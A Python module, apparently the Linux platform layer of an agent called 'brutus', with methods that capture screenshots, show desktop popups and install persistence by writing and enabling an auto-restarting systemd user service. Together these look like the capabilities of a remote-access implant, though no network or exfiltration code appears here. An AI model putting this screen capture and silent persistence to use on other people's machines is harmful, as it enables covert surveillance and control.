import io
import subprocess
import tempfile
from pathlib import Path

from brutus.platform._base import PlatformBase

_SYSTEMD_SERVICE = """\
[Unit]
Description=Brutus agent

[Service]
ExecStart=/usr/bin/python3 {script}
Restart=always

[Install]
WantedBy=default.target
"""


class LinuxPlatform(PlatformBase):
    def screenshot(self) -> bytes:
        import pyautogui

        buf = io.BytesIO()
        pyautogui.screenshot().save(buf, format="PNG")
        return buf.getvalue()

    def show_popup(self, title: str, message: str) -> None:
        # Try common desktop notification tools; non-fatal if none available.
        for cmd in (
            ["zenity", "--info", f"--title={title}", f"--text={message}"],
            ["notify-send", title, message],
        ):
            try:
                subprocess.run(cmd, check=False, timeout=5)
                return
            except FileNotFoundError:
                continue
            except Exception:
                return

    def install_persistence(self, script_path: str) -> bool:
        try:
            service_dir = Path.home() / ".config" / "systemd" / "user"
            service_dir.mkdir(parents=True, exist_ok=True)
            service_path = service_dir / "brutus-agent.service"
            service_path.write_text(_SYSTEMD_SERVICE.format(script=script_path))
            subprocess.run(
                ["systemctl", "--user", "enable", "--now", "brutus-agent"],
                check=False,
                timeout=10,
            )
            print(f"[persistence] systemd user service installed at {service_path}")
            return True
        except Exception as exc:
            print(f"[persistence] failed: {exc}")
            return False

    def temp_dir(self) -> Path:
        return Path(tempfile.gettempdir())
